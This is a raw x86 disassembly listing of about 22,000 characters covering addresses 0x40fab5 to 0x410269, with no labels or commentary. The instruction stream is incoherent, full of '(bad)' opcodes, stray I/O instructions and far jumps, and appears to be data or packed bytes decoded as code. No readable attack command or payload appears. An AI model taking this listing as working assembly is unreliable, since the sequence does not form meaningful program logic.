  40fab5:	push   0x149d3de9
  40faba:	bound  ebp,QWORD PTR [ebp+0x553a244e]
  40fac0:	es out dx,al
  40fac2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fac3:	jl     0x40fad4
  40fac5:	fmul   st,st(1)
  40fac7:	push   ebx
  40fac8:	mov    DWORD PTR [edi],esi
  40faca:	mov    ecx,0x6ec7cd5e
  40facf:	dec    ebx
  40fad0:	sbb    ecx,eax
  40fad2:	jp     0x40fae9
  40fad4:	popa   
  40fad5:	mov    ebx,0x25c8531f
  40fada:	leave  
  40fadb:	(bad)  
  40fadc:	cwde   
  40fadd:	rcl    DWORD PTR [ebp-0xf],cl
  40fae0:	les    ecx,FWORD PTR [eax]
  40fae2:	das    
  40fae3:	mov    gs,WORD PTR [ebp+eax*1-0x60]
  40fae7:	enter  0xde67,0x2f
  40faeb:	mov    eax,ds:0x1f07cd07
  40faf0:	dec    esp
  40faf1:	jmp    0x9883bcfc
  40faf6:	(bad)  
  40faf7:	lahf   
  40faf8:	clc    
  40faf9:	push   esp
  40fafa:	mov    bh,0xe9
  40fafc:	mov    eax,0x31c09440
  40fb01:	mov    ebx,0xa35f9545
  40fb06:	dec    ecx
  40fb07:	sahf   
  40fb08:	inc    edx
  40fb09:	mov    ch,0xf4
  40fb0b:	mov    eax,0xfda67c28
  40fb10:	sbb    ebp,ebx
  40fb12:	cmp    DWORD PTR [edi-0x28d24922],esp
  40fb18:	pushf  
  40fb19:	into   
  40fb1a:	pop    eax
  40fb1b:	add    eax,DWORD PTR [eax]
  40fb1d:	mov    gs,WORD PTR [eax+0x69]
  40fb20:	mov    ch,al
  40fb22:	adc    DWORD PTR [edx+0x18ee9f10],esp
  40fb28:	(bad)  
  40fb29:	arpl   WORD PTR ds:0x9a068b84,sp
  40fb2f:	fs mov bl,0x29
  40fb32:	adc    DWORD PTR [edi-0x6c],edx
  40fb35:	push   esp
  40fb36:	daa    
  40fb37:	popa   
  40fb38:	lods   al,BYTE PTR ds:[esi]
  40fb39:	pop    esi
  40fb3a:	dec    esp
  40fb3b:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40fb3d:	push   ebx
  40fb3e:	pop    ebx
  40fb3f:	out    0x9a,eax
  40fb41:	test   DWORD PTR [edi+0x67570add],edi
  40fb47:	test   BYTE PTR [esi-0x78],0xde
  40fb4b:	into   
  40fb4c:	ins    BYTE PTR es:[edi],dx
  40fb4d:	mov    edx,0xfae5c9fd
  40fb52:	cdq    
  40fb53:	stos   BYTE PTR es:[edi],al
  40fb54:	pop    ebp
  40fb55:	cmp    al,0x5
  40fb57:	sub    esp,edx
  40fb59:	adc    BYTE PTR [ebx],cl
  40fb5b:	mov    esp,ecx
  40fb5d:	push   ebx
  40fb5e:	inc    esp
  40fb5f:	fldenv [ecx]
  40fb61:	aam    0xec
  40fb63:	and    ecx,edi
  40fb65:	inc    edx
  40fb66:	jmp    0x4b96:0xd45a3b5d
  40fb6d:	lods   eax,DWORD PTR ds:[esi]
  40fb6e:	or     BYTE PTR [edi+0xb598313],dl
  40fb74:	(bad)  [edi-0x2ea50c7e]
  40fb7a:	sbb    al,0xb8
  40fb7c:	jg     0x40fb2e
  40fb7e:	mov    eax,ds:0x495e9826
  40fb83:	pop    edi
  40fb84:	repz lahf 
  40fb86:	je     0x40fbd7
  40fb88:	push   edi
  40fb89:	ret    
  40fb8a:	push   ss
  40fb8b:	mov    al,ds:0x49176cf1
  40fb90:	stos   BYTE PTR es:[edi],al
  40fb91:	nop
  40fb92:	mov    ds:0x86c4d8ae,al
  40fb97:	xchg   esi,eax
  40fb98:	xlat   BYTE PTR ds:[ebx]
  40fb99:	xchg   ecx,eax
  40fb9a:	sub    eax,0xbe81f21f
  40fb9f:	sbb    eax,0xfea950b
  40fba4:	mov    esp,0xf41a3a38
  40fba9:	sub    esi,DWORD PTR [edx]
  40fbab:	jbe    0x40fb36
  40fbad:	pop    esp
  40fbae:	cmc    
  40fbaf:	scas   eax,DWORD PTR es:[edi]
  40fbb0:	add    ebx,DWORD PTR [edi]
  40fbb2:	lods   al,BYTE PTR ds:[esi]
  40fbb3:	xchg   ebx,eax
  40fbb4:	add    al,0x40
  40fbb6:	dec    DWORD PTR [ebp+edx*2+0x2a]
  40fbba:	outs   dx,DWORD PTR ds:[esi]
  40fbbb:	js     0x40fbdf
  40fbbd:	jns    0x40fb62
  40fbbf:	mov    dl,0xa4
  40fbc1:	stos   DWORD PTR es:[edi],eax
  40fbc2:	fistp  DWORD PTR [edx-0x6b]
  40fbc5:	mov    bl,0xba
  40fbc7:	in     al,dx
  40fbc8:	mov    gs,WORD PTR ds:[edi]
  40fbcb:	iret   
  40fbcc:	clc    
  40fbcd:	mov    eax,0xb4240104
  40fbd2:	les    edi,FWORD PTR [esi]
  40fbd4:	or     eax,0x9fd6b53b
  40fbd9:	sbb    ebp,DWORD PTR [esi+0x6249ef7b]
  40fbdf:	fidiv  DWORD PTR [ebx+0x598c192]
  40fbe5:	jns    0x40fbc4
  40fbe7:	lods   al,BYTE PTR ds:[esi]
  40fbe8:	ss mov bl,0x9e
  40fbeb:	cld    
  40fbec:	mov    ebp,0x8e1d911e
  40fbf1:	pop    ebx
  40fbf3:	into   
  40fbf4:	es push ss
  40fbf6:	sti    
  40fbf7:	or     edi,DWORD PTR [esi+0x6ccca549]
  40fbfd:	(bad)  
  40fbfe:	sub    BYTE PTR [edi],bh
  40fc00:	out    dx,eax
  40fc01:	or     eax,0x573aca46
  40fc06:	mov    al,ds:0x67cca415
  40fc0b:	sbb    ecx,DWORD PTR [edi+eax*8]
  40fc0e:	adc    ebp,DWORD PTR [edi+0x3f]
  40fc11:	and    al,0x5
  40fc13:	fisttp QWORD PTR es:[ebp-0x50779db8]
  40fc1a:	xor    edi,DWORD PTR [ebp+0x63]
  40fc1d:	xlat   BYTE PTR ds:[ebx]
  40fc1e:	dec    ebx
  40fc1f:	mov    bl,0x1b
  40fc21:	fiadd  DWORD PTR [ebp+0x74ca7900]
  40fc27:	inc    ebx
  40fc28:	jl     0x40fc03
  40fc2a:	ins    BYTE PTR es:[edi],dx
  40fc2b:	pop    ebp
  40fc2c:	push   es
  40fc2d:	sbb    edi,DWORD PTR [edx+0x65]
  40fc30:	jo     0x40fbee
  40fc32:	aas    
  40fc33:	pop    ecx
  40fc34:	call   0x4cb8:0x598d4dc4
  40fc3b:	and    DWORD PTR [ebx-0x2f5da69a],esi
  40fc41:	pop    ss
  40fc42:	xchg   BYTE PTR [edx+eax*1+0xbb90714],ah
  40fc49:	gs rol al,1
  40fc4c:	dec    esp
  40fc4d:	cmp    edx,DWORD PTR [ebp-0x78]
  40fc50:	and    eax,0x3003ba06
  40fc55:	inc    eax
  40fc56:	cwde   
  40fc57:	fistp  WORD PTR [edi+eiz*2+0x17]
  40fc5b:	xlat   BYTE PTR ds:[ebx]
  40fc5c:	or     BYTE PTR [edi],dh
  40fc5e:	daa    
  40fc5f:	pop    esi
  40fc60:	sbb    BYTE PTR [eax+0x38],bl
  40fc63:	out    dx,al
  40fc64:	jne    0x40fcad
  40fc66:	mov    ebx,0xfa9c824
  40fc6b:	sub    edx,DWORD PTR [edi+0x2a]
  40fc6e:	jecxz  0x40fcbe
  40fc70:	xor    eax,0xd5b2aab4
  40fc75:	lock addr16 lahf 
  40fc78:	pop    eax
  40fc79:	sub    dl,BYTE PTR [edi+0x213ec43e]
  40fc7f:	gs push es
  40fc81:	inc    eax
  40fc82:	add    BYTE PTR [eax],0x1c
  40fc85:	pusha  
  40fc86:	std    
  40fc87:	int3   
  40fc88:	xor    bh,BYTE PTR [edx]
  40fc8a:	(bad)  
  40fc8b:	cmp    eax,0x178276b
  40fc90:	sti    
  40fc91:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc93:	push   eax
  40fc94:	or     al,0x67
  40fc96:	xor    ebp,ecx
  40fc98:	clc    
  40fc99:	das    
  40fc9a:	xchg   esi,eax
  40fc9b:	xor    eax,0xc2171797
  40fca0:	addr16 js 0x40fcf7
  40fca3:	in     eax,dx
  40fca4:	into   
  40fca5:	dec    edx
  40fca6:	imul   edi,DWORD PTR [esi+edx*4],0x561713ff
  40fcad:	call   0x6ac7:0x74137b
  40fcb4:	and    DWORD PTR [esi],edi
  40fcb6:	cmp    eax,0x8de0e589
  40fcbb:	sbb    bl,dh
  40fcbd:	mov    eax,0xe1445b18
  40fcc2:	inc    ebp
  40fcc3:	mov    eax,DWORD PTR [edx+0x14]
  40fcc6:	mov    ds:0x76f7046b,eax
  40fccb:	push   ecx
  40fccc:	push   edi
  40fccd:	aam    0x7c
  40fccf:	jns    0x40fc6f
  40fcd1:	loope  0x40fd25
  40fcd3:	outs   dx,DWORD PTR ds:[esi]
  40fcd4:	lds    ecx,FWORD PTR [ebp-0x3db704d4]
  40fcda:	add    esp,DWORD PTR [esi+eax*1+0x7015744d]
  40fce1:	sub    esp,DWORD PTR [edi+edi*4+0x24]
  40fce5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fce6:	repz dec esi
  40fce8:	pop    eax
  40fce9:	scas   eax,DWORD PTR es:[edi]
  40fcea:	or     bh,dh
  40fcec:	push   ds
  40fced:	mov    eax,fs
  40fcef:	stc    
  40fcf0:	cwde   
  40fcf1:	push   ss
  40fcf2:	xchg   ebx,eax
  40fcf3:	fldcw  WORD PTR [edi+0x539a843f]
  40fcf9:	jmp    0x40fd45
  40fcfb:	cmp    DWORD PTR [esi],ebx
  40fcfd:	mov    ebp,0x3050ca08
  40fd02:	ins    DWORD PTR es:[edi],dx
  40fd03:	aas    
  40fd04:	xchg   esp,eax
  40fd05:	or     eax,0xaa3ec627
  40fd0a:	sbb    edx,DWORD PTR [ebp+0x44]
  40fd0d:	jmp    0xc67c1e25
  40fd12:	sahf   
  40fd13:	add    dh,dh
  40fd15:	stos   DWORD PTR es:[edi],eax
  40fd16:	xchg   BYTE PTR [ebp+0x5],dh
  40fd19:	fnsave [eax]
  40fd1b:	xchg   BYTE PTR [ebp-0x5c159017],ah
  40fd21:	rol    DWORD PTR [edi+eiz*4],1
  40fd24:	mov    al,ds:0xb2f8cdce
  40fd29:	add    BYTE PTR ds:0x4f37eda9,0x59
  40fd30:	sbb    DWORD PTR [edi-0x62],ebp
  40fd33:	in     eax,0xc7
  40fd35:	fs (bad) 
  40fd37:	nop
  40fd38:	push   0xc
  40fd3a:	pop    eax
  40fd3b:	pop    esp
  40fd3c:	imul   ebx,DWORD PTR [edi+0x7361bdc2],0xffffffbc
  40fd43:	mov    DWORD PTR [eax-0x26a03892],ecx
  40fd49:	cmp    eax,0x785357ae
  40fd4e:	sbb    eax,0xcd5871c3
  40fd53:	add    al,0x6b
  40fd55:	mov    esp,0x333fbb7d
  40fd5a:	pop    es
  40fd5b:	sbb    al,0x6
  40fd5d:	pop    eax
  40fd5e:	repz repz add ah,BYTE PTR ds:0xe8648b56
  40fd66:	(bad)  
  40fd67:	cmp    DWORD PTR [ebx+0x4554ec15],ebx
  40fd6d:	ins    DWORD PTR es:[edi],dx
  40fd6e:	jae    0x40fd40
  40fd70:	dec    ebx
  40fd71:	push   esp
  40fd72:	hlt    
  40fd73:	retf   
  40fd74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd75:	loopne 0x40fd3a
  40fd77:	and    eax,0x53512c7c
  40fd7c:	aas    
  40fd7d:	sub    eax,0x1caabf30
  40fd82:	push   ebx
  40fd83:	add    al,0xc
  40fd85:	fld    TBYTE PTR [edx+0x41e99e95]
  40fd8b:	jle    0x40fdf3
  40fd8d:	rcl    DWORD PTR [ebx-0x1],0x5e
  40fd91:	jl     0x40fdcd
  40fd93:	xor    BYTE PTR [ebx+eiz*4],ah
  40fd96:	mov    ss,WORD PTR [esi-0x56590f8f]
  40fd9c:	mov    eax,0xd0772c30
  40fda1:	fs popa 
  40fda3:	in     al,dx
  40fda4:	xchg   esi,eax
  40fda5:	stos   DWORD PTR es:[edi],eax
  40fda6:	pop    eax
  40fda7:	(bad)  
  40fda8:	fisubr DWORD PTR [edx]
  40fdaa:	xor    bh,BYTE PTR [edi+0x2f366b78]
  40fdb0:	into   
  40fdb1:	js     0x40fd33
  40fdb3:	(bad)  
  40fdb5:	mov    eax,ds:0x7ba30082
  40fdba:	mul    BYTE PTR [esi+ebp*4-0x6]
  40fdbe:	xor    eax,0x9586f0cc
  40fdc3:	test   eax,0x249ce13c
  40fdc8:	sbb    bh,ah
  40fdca:	sub    eax,0x916e1159
  40fdcf:	daa    
  40fdd0:	add    DWORD PTR [eax+0x31],edx
  40fdd3:	xchg   ebp,eax
  40fdd4:	fidiv  WORD PTR [ecx]
  40fdd6:	adc    al,0xfb
  40fdd8:	call   DWORD PTR [edx]
  40fdda:	dec    edi
  40fddb:	test   al,0x1d
  40fddd:	xchg   edi,eax
  40fdde:	push   eax
  40fddf:	aad    0xf7
  40fde1:	mov    ebp,0x2a5ad3f
  40fde6:	mov    ecx,0x2c1bd118
  40fdeb:	xchg   ecx,eax
  40fdec:	sub    BYTE PTR [ebx+0x27],ch
  40fdef:	loopne 0x40fdae
  40fdf1:	dec    esp
  40fdf2:	add    eax,DWORD PTR [edi-0x42acf137]
  40fdf8:	jno    0x40fe19
  40fdfa:	(bad)  
  40fdfc:	mov    al,ds:0xae9b1168
  40fe01:	pop    ss
  40fe02:	lock adc dh,BYTE PTR [edx-0x17]
  40fe06:	or     ch,ah
  40fe08:	les    edi,FWORD PTR [ecx-0x3b9a5298]
  40fe0e:	bound  ebp,QWORD PTR [edi+0x75cddc9a]
  40fe14:	fwait
  40fe15:	jb     0x40fdee
  40fe17:	rcl    cl,0xb5
  40fe1a:	xchg   BYTE PTR [esi+0x5914eaab],bl
  40fe20:	hlt    
  40fe21:	bound  edi,QWORD PTR [edi]
  40fe23:	or     al,0xe2
  40fe25:	add    eax,0x1b0e50f0
  40fe2a:	repnz repnz push 0x3bf16658
  40fe31:	mov    ?,WORD PTR [edx]
  40fe33:	scas   al,BYTE PTR es:[edi]
  40fe34:	adc    eax,0xffffffeb
  40fe37:	push   0xffffff94
  40fe39:	jns    0x40fdc5
  40fe3b:	stos   DWORD PTR es:[edi],eax
  40fe3c:	sub    al,0x6a
  40fe3e:	out    dx,al
  40fe3f:	push   esp
  40fe40:	inc    ebp
  40fe41:	adc    eax,0xa3242844
  40fe46:	fst    QWORD PTR [ebp-0x7]
  40fe49:	mov    ds:0x6617e07,al
  40fe4e:	xchg   DWORD PTR [ebx-0x74404470],esi
  40fe54:	daa    
  40fe55:	repnz inc ebx
  40fe57:	mov    cl,0xe0
  40fe59:	enter  0xb58a,0x39
  40fe5d:	xchg   BYTE PTR [ecx+0x2224120b],dl
  40fe63:	in     eax,0x1a
  40fe65:	mov    bh,0x89
  40fe67:	adc    esi,DWORD PTR [esi-0x2d]
  40fe6a:	xchg   esi,eax
  40fe6b:	and    DWORD PTR [edi+edi*4],ecx
  40fe6e:	inc    esi
  40fe6f:	xchg   edi,eax
  40fe70:	loopne 0x40fee1
  40fe72:	inc    edi
  40fe73:	pushf  
  40fe74:	push   ecx
  40fe75:	inc    esp
  40fe76:	cmc    
  40fe77:	sub    BYTE PTR [ebp+0x606d5787],al
  40fe7d:	cli    
  40fe7e:	out    dx,eax
  40fe7f:	add    BYTE PTR [eax-0x2af1d337],al
  40fe85:	adc    ecx,DWORD PTR [esi+eiz*8+0x5195dc3b]
  40fe8c:	fs sbb eax,0x73da4175
  40fe92:	dec    ecx
  40fe93:	inc    eax
  40fe94:	cmp    edx,edx
  40fe96:	ret    0xc21d
  40fe99:	fdivr  DWORD PTR [edx]
  40fe9b:	push   cs
  40fe9c:	aad    0x45
  40fe9e:	les    ecx,FWORD PTR [ebx+0x25ddd479]
  40fea4:	mov    eax,0xa9eb1a95
  40fea9:	jmp    0x2e6502ba
  40feae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40feaf:	ds mov ecx,0xce7bc4b6
  40feb5:	sub    BYTE PTR [edi],dh
  40feb7:	fsub   QWORD PTR cs:[ecx+0x46acd2be]
  40febe:	aad    0x9b
  40fec0:	in     eax,0xf3
  40fec2:	test   eax,0x91865ca0
  40fec7:	aas    
  40fec8:	(bad)  [ebp+0xb31d29]
  40fece:	jmp    0x4ab7bf92
  40fed3:	lods   eax,DWORD PTR ds:[esi]
  40fed4:	shl    edx,cl
  40fed6:	repz cld 
  40fed8:	cmp    eax,DWORD PTR [edx]
  40feda:	outs   dx,DWORD PTR ds:[esi]
  40fedb:	and    DWORD PTR [ebx-0x1f9731a5],ebx
  40fee1:	fwait
  40fee2:	(bad)  
  40fee3:	retf   0x815f
  40fee6:	inc    edx
  40fee7:	bound  ebp,QWORD PTR [esi+0xa]
  40feea:	and    bl,BYTE PTR [ebp+eiz*1-0x4901359c]
  40fef1:	js     0x40febc
  40fef3:	cmp    ebx,DWORD PTR [esi-0x5d]
  40fef6:	cmp    edx,DWORD PTR [esi]
  40fef8:	popf   
  40fef9:	pop    esi
  40fefa:	sbb    DWORD PTR [ebx+0x21],0x8aa497c0
  40ff01:	shr    BYTE PTR [ecx-0xda0091e],0x36
  40ff08:	sub    edx,DWORD PTR [ebp+0x45]
  40ff0b:	xor    eax,0x5e2f99
  40ff10:	test   DWORD PTR [ebp+0x259cde9d],ebx
  40ff16:	adc    al,0xb4
  40ff18:	in     eax,0x67
  40ff1a:	adc    eax,0x19152aaf
  40ff1f:	xchg   BYTE PTR ds:0x2fa692dd,ch
  40ff25:	test   eax,0x52f4ce93
  40ff2a:	mov    ah,0x85
  40ff2c:	mov    ecx,0xbe1f3485
  40ff31:	fistp  DWORD PTR [esp+esi*8+0x2e966d7d]
  40ff38:	ror    DWORD PTR [ecx+0x3e],cl
  40ff3b:	cmp    DWORD PTR [ecx],ebp
  40ff3d:	pop    DWORD PTR [ebx]
  40ff3f:	mov    ch,0xda
  40ff41:	xor    BYTE PTR [esi],al
  40ff43:	mov    esp,0x69af1638
  40ff48:	pop    ebp
  40ff49:	dec    edi
  40ff4a:	pop    ebx
  40ff4b:	ja     0x40ff97
  40ff4d:	not    DWORD PTR [ebx]
  40ff4f:	push   ecx
  40ff50:	pop    ecx
  40ff51:	or     al,0xb
  40ff53:	(bad)  
  40ff54:	in     eax,dx
  40ff55:	scas   al,BYTE PTR es:[edi]
  40ff56:	inc    esp
  40ff57:	sbb    al,0x90
  40ff59:	rcl    cl,1
  40ff5b:	call   0x9fd2bc16
  40ff60:	or     eax,0x1874290
  40ff65:	xchg   edi,eax
  40ff66:	cmp    al,0x11
  40ff68:	(bad)  
  40ff69:	mov    bh,0x3b
  40ff6b:	push   esi
  40ff6c:	lahf   
  40ff6d:	pop    ebp
  40ff6e:	inc    ebx
  40ff6f:	ficom  WORD PTR [ecx-0x51c659a0]
  40ff75:	push   0xffffffaa
  40ff77:	shl    DWORD PTR [ebp+esi*8-0x6e],cl
  40ff7b:	adc    eax,0x2ae0ef20
  40ff80:	js     0x40ffc2
  40ff82:	ins    BYTE PTR es:[edi],dx
  40ff83:	jmp    0x462e:0xe03ec8a7
  40ff8a:	test   DWORD PTR [ebp+0x3060a5fd],edi
  40ff90:	rol    DWORD PTR [edx],0x6a
  40ff93:	sub    eax,DWORD PTR [ecx+0xa]
  40ff96:	stos   BYTE PTR es:[edi],al
  40ff97:	jmp    0x40ff41
  40ff99:	mov    al,ds:0xcb80f9f6
  40ff9e:	mov    dh,0xd0
  40ffa0:	adc    dh,0x72
  40ffa3:	(bad)  
  40ffa4:	test   al,0xc3
  40ffa6:	mov    ebx,0x482a9bdf
  40ffab:	xchg   ch,ah
  40ffad:	fsub   DWORD PTR [edx+0x39f5ed27]
  40ffb3:	jmp    0x41001a
  40ffb5:	ss adc eax,0x897c7b50
  40ffbb:	test   eax,0x371fee0a
  40ffc0:	mov    eax,ds:0xaac0c355
  40ffc5:	xor    edx,0x32ec3cae
  40ffcb:	xchg   bh,bl
  40ffcd:	pushf  
  40ffce:	inc    ecx
  40ffcf:	arpl   WORD PTR [ebx+0x1988d9a6],cx
  40ffd5:	test   al,0x61
  40ffd7:	mov    dh,0x9d
  40ffd9:	mov    eax,ds:0x625f31d3
  40ffde:	rcl    BYTE PTR [ebx-0x2e632469],1
  40ffe4:	leave  
  40ffe5:	jecxz  0x40ffa2
  40ffe7:	pop    ds
  40ffe8:	push   ebp
  40ffe9:	pop    eax
  40ffea:	dec    ecx
  40ffeb:	in     eax,dx
  40ffec:	or     eax,DWORD PTR [edi]
  40ffee:	sub    al,0x25
  40fff0:	or     cl,BYTE PTR [ebx*1+0x7107388]
  40fff7:	dec    edi
  40fff8:	mov    esp,0x9da9248c
  40fffd:	mov    ecx,0xe7765c47
  410002:	lods   al,BYTE PTR ds:[esi]
  410003:	call   FWORD PTR [ebx+0x24]
  410006:	fadd   st(1),st
  410008:	xor    dl,BYTE PTR [ebx-0x1d]
  41000b:	push   esp
  41000c:	inc    eax
  41000d:	push   es
  41000e:	jne    0x41005e
  410010:	ror    dh,1
  410012:	mov    ebx,0x79c0e4a2
  410017:	test   al,0x58
  410019:	in     eax,dx
  41001a:	jle    0x40ffa5
  41001c:	outs   dx,BYTE PTR ds:[esi]
  41001d:	test   BYTE PTR [ecx],ch
  41001f:	outs   dx,BYTE PTR ds:[esi]
  410020:	adc    al,0xe1
  410022:	out    0x76,eax
  410024:	jae    0x41005d
  410026:	imul   eax,ecx,0x77
  410029:	mov    cl,0x7f
  41002b:	scas   eax,DWORD PTR es:[edi]
  41002c:	repz aas 
  41002e:	(bad)  
  41002f:	fidiv  WORD PTR [esi+0x5e4361bd]
  410035:	xchg   esp,eax
  410036:	mov    eax,ds:0x9ec33d9
  41003b:	jl     0x410063
  41003d:	cmp    dl,BYTE PTR [ecx-0x1ac9bda5]
  410043:	jmp    0x3d49e819
  410048:	aam    0x9e
  41004a:	pop    ebp
  41004b:	dec    esi
  41004c:	sbb    al,0xfd
  41004e:	lods   eax,DWORD PTR ds:[esi]
  41004f:	jmp    0x41002a
  410051:	ja     0x40ffdf
  410053:	push   es
  410054:	jo     0x40ffe5
  410056:	jg     0x410059
  410058:	xchg   BYTE PTR [edx*4+0x30174ccb],dl
  41005f:	das    
  410060:	(bad)  
  410061:	xlat   BYTE PTR ds:[ebx]
  410062:	sub    DWORD PTR [edi],0xffffffa6
  410065:	sbb    al,0x9e
  410067:	pop    eax
  410068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410069:	jne    0x4100e2
  41006b:	loopne 0x410078
  41006d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41006e:	or     eax,0x23a5abcb
  410073:	cmp    DWORD PTR [esi],esp
  410075:	inc    ebx
  410076:	mov    ebp,0xd53693f1
  41007b:	or     eax,0xc6eaf15b
  410080:	cli    
  410081:	into   
  410082:	pop    eax
  410083:	mov    es,esp
  410085:	add    esi,DWORD PTR [ebp-0x23]
  410088:	(bad)  
  410089:	in     al,0x20
  41008b:	test   ebx,ecx
  41008d:	sub    bl,bh
  41008f:	data16 fidivr WORD PTR [edi+0x12]
  410093:	jae    0x4100af
  410095:	adc    DWORD PTR [esi+esi*1-0x75e3773c],esp
  41009c:	sahf   
  41009d:	pop    ecx
  41009e:	not    BYTE PTR [eiz*1-0x730ae37e]
  4100a5:	fcmovbe st,st(6)
  4100a7:	cmp    BYTE PTR [ecx],0x62
  4100aa:	sbb    ah,BYTE PTR [edi+0x147cc7bc]
  4100b0:	or     bl,BYTE PTR [eax+0xb]
  4100b3:	je     0x410117
  4100b5:	xchg   edx,eax
  4100b6:	mov    esi,0x34effbe9
  4100bb:	adc    edi,edx
  4100bd:	mov    ebx,DWORD PTR es:[ecx+0x7b06384]
  4100c4:	and    edi,ebp
  4100c6:	sub    al,0x14
  4100c8:	je     0x4100b9
  4100ca:	test   BYTE PTR [edx+esi*4-0x5e77a6fd],0xc4
  4100d2:	ret    0xa820
  4100d5:	mov    ds:0x519493c9,eax
  4100da:	dec    esi
  4100db:	test   al,0xc4
  4100dd:	js     0x4100fd
  4100df:	pop    edi
  4100e0:	pop    esi
  4100e1:	loop   0x410081
  4100e3:	xor    DWORD PTR [esi+0x1257756e],eax
  4100e9:	aad    0x7a
  4100eb:	leave  
  4100ec:	out    dx,al
  4100ed:	mov    ds:0x3915bc59,eax
  4100f2:	mov    bh,0x9a
  4100f4:	rcl    ch,0x13
  4100f7:	ss mov dh,0x69
  4100fa:	lock dec esi
  4100fc:	pushf  
  4100fd:	inc    ebp
  4100fe:	push   esi
  4100ff:	dec    ebx
  410100:	mov    al,BYTE PTR [eax-0x17acde8e]
  410106:	sub    al,0xbc
  410108:	mov    ebx,DWORD PTR [edx-0xcf5fcb3]
  41010e:	jae    0x4100f7
  410110:	xchg   edx,eax
  410111:	jmp    0x802c6d09
  410116:	std    
  410117:	push   esi
  410118:	xor    eax,0xea6f8ba9
  41011d:	mov    ch,BYTE PTR [edi]
  41011f:	mov    esp,DWORD PTR [edx+ebx*4-0x2470a0f]
  410126:	or     ebx,DWORD PTR [ebp-0x5d]
  410129:	and    BYTE PTR [ebx+0x6036058],dh
  41012f:	jp     0x410171
  410131:	retf   0x2e64
  410134:	mov    dl,0xe6
  410136:	cmp    eax,0x3dcac57f
  41013b:	sbb    ecx,eax
  41013d:	imul   ecx,DWORD PTR [edi+0x50f14faf],0x25
  410144:	jp     0x410176
  410146:	aaa    
  410147:	in     eax,dx
  410148:	add    BYTE PTR [esi+eiz*1],cl
  41014b:	pop    ebx
  41014c:	fs mov bh,0x6b
  41014f:	nop
  410150:	add    edi,DWORD PTR [ecx+0x7b]
  410153:	sti    
  410154:	gs ret 
  410156:	pushf  
  410157:	mov    WORD PTR [ebx-0x7],fs
  41015a:	push   esp
  41015b:	add    esi,ecx
  41015d:	and    eax,ebp
  41015f:	sub    BYTE PTR [edx-0x43],bl
  410162:	mov    edi,0x75813f38
  410167:	xchg   ebp,eax
  410168:	hlt    
  410169:	add    dl,BYTE PTR [edi-0x43]
  41016c:	cli    
  41016d:	jns    0x4101a0
  41016f:	inc    edx
  410170:	jo     0x4101ea
  410172:	push   ds
  410173:	int3   
  410174:	inc    esi
  410175:	cwde   
  410176:	test   BYTE PTR [ecx-0x3790d62e],dl
  41017c:	lods   eax,DWORD PTR ds:[esi]
  41017d:	dec    esp
  41017e:	not    edx
  410180:	dec    edx
  410181:	push   edx
  410182:	cdq    
  410183:	push   esp
  410184:	cmp    BYTE PTR [edi-0x72d07b77],bl
  41018a:	mov    bl,0xe7
  41018c:	pop    esi
  41018d:	ficomp DWORD PTR [edx]
  41018f:	ficom  WORD PTR [eax-0x79]
  410192:	or     al,ah
  410194:	out    0x8a,eax
  410196:	or     bl,BYTE PTR [eax]
  410198:	dec    ebx
  410199:	inc    ebx
  41019a:	scas   al,BYTE PTR es:[edi]
  41019b:	idiv   DWORD PTR [ecx-0x32]
  41019e:	cmp    esp,esi
  4101a0:	test   bh,ch
  4101a2:	ret    
  4101a3:	int    0xb6
  4101a5:	pop    esp
  4101a6:	cmp    BYTE PTR [ecx+0x50bb7892],cl
  4101ac:	cmp    edx,DWORD PTR cs:[eax+0x2e]
  4101b0:	cmp    edx,eax
  4101b2:	xchg   ecx,eax
  4101b3:	xchg   edi,eax
  4101b4:	fwait
  4101b5:	aam    0x36
  4101b7:	or     al,0x68
  4101b9:	fcmovb st,st(6)
  4101bb:	es popa 
  4101bd:	mov    eax,ds:0xdcec5420
  4101c2:	push   ebp
  4101c3:	lods   eax,DWORD PTR ds:[esi]
  4101c4:	mov    ecx,es
  4101c6:	bound  ecx,QWORD PTR [ecx+0x645150c3]
  4101cc:	mov    cl,0x55
  4101ce:	lods   al,BYTE PTR ds:[esi]
  4101cf:	inc    ebp
  4101d0:	cli    
  4101d1:	adc    BYTE PTR [esi+0x53],0x25
  4101d5:	fdivr  QWORD PTR [esi+0x4fdcb386]
  4101db:	pop    edi
  4101dc:	adc    esp,DWORD PTR [ebx]
  4101de:	jmp    0xaf79:0xd279d64e
  4101e5:	sub    eax,0x89e4bfd9
  4101ea:	std    
  4101eb:	or     BYTE PTR [esi],dl
  4101ed:	test   DWORD PTR [edx-0xa],edi
  4101f0:	push   ss
  4101f1:	data16 lahf 
  4101f3:	(bad)  
  4101f4:	mov    WORD PTR [edx-0x193193e7],ss
  4101fa:	pop    es
  4101fb:	and    DWORD PTR [eax-0x6],ecx
  4101fe:	xchg   DWORD PTR [esi+0x1b3d7a9c],edx
  410204:	xor    BYTE PTR [ebx],0x61
  410207:	mov    eax,ds:0xcc3b7a16
  41020c:	dec    edx
  41020d:	int3   
  41020e:	dec    eax
  41020f:	lds    edi,FWORD PTR [esi]
  410211:	aad    0xfe
  410213:	addr16 jge 0x410277
  410216:	and    ebx,eax
  410218:	push   cs
  410219:	add    bl,BYTE PTR [ebp+0x318e702a]
  41021f:	ds aas 
  410221:	adc    eax,0x377ad3c0
  410226:	xor    al,0x50
  410228:	mov    esp,0xef0da273
  41022d:	fnstsw WORD PTR [ebp-0x34196671]
  410233:	arpl   WORD PTR [ebx+0x6ad64317],dx
  410239:	mov    ch,0xd8
  41023b:	adc    edi,DWORD PTR [eax]
  41023d:	dec    eax
  41023e:	xchg   BYTE PTR [ecx+0x28],bh
  410241:	(bad)  
  410243:	ror    DWORD PTR es:[edi+ecx*2],0xd5
  410248:	(bad)  
  410249:	jae    0x410251
  41024b:	int    0x9b
  41024d:	ret    0xa553
  410250:	fucompp 
  410252:	push   0x2f83b39e
  410257:	es sbb al,0x38
  41025a:	inc    edx
  41025b:	mov    esi,0x340f2f0b
  410260:	and    eax,0x44039e83
  410265:	test   DWORD PTR [ecx],eax
  410267:	mov    cl,0x2c
  410269:	inc    ebp
